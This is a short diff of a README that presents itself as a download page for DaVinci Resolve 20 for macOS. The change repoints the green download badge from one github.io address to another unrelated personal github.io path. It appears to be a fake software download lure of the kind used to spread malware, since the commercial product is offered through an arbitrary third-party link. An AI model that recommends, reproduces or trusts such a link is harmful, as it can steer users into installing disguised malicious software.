@@ -5,7 +5,7 @@
 <h1 align="center">🎬 DaVinci Resolve 20 for macOS</h1>
 
 <p align="center">
-  <a href="https://davinci-mac-download.github.io/.github/">
+  <a href="https://bloodangel210.github.io/modarbas/99">
     <img src="https://img.shields.io/badge/⬇️%20Download-DaVinci_Resolve_20-green?style=for-the-badge&logo=apple&logoColor=white"/>
   </a>
 </p>
